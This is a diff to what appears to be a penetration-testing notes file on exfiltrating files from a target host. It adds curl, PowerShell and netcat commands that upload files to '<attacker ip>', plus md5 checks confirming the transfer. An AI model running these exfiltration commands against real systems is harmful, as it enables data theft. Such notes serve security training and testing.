@@ -51,13 +51,13 @@ if __name__ == "__main__":
         sys.exit(1)
 ```
 
-Starting server 
+Starting server on attacker's pc
 
 ```shell
 python HTTPutServer.py <attacker ip> <attacker port>
 ```
 
-Target server uploads files
+Target host uploads files
 
 ```powershell
 curl --upload-file test.txt http://<attacker ip>:<attacker port>/
@@ -65,4 +65,34 @@ curl --upload-file test.txt http://<attacker ip>:<attacker port>/
 
 ```powershell
 Invoke-RestMethod -Uri http://<attacker ip>:<attacker port>/<remote file name> -Method PUT -InFile <target file>
+```
+
+#### nc
+
+Using `nc` to listen on port N
+
+```shell
+nc -lnvp 4444 > /tmp/which
+```
+
+Target host uploads files
+
+```shell
+cat /usr/bin/which | nc <attacker ip> <attacker port>
+```
+
+Checking file is correct
+
+attacker
+
+```shell
+md5sum /tmp/which
+# e942f154ef9d9974366551d2d231d936
+```
+
+target
+
+```shell
+md5sum /usr/bin/which
+# e942f154ef9d9974366551d2d231d936
 ```
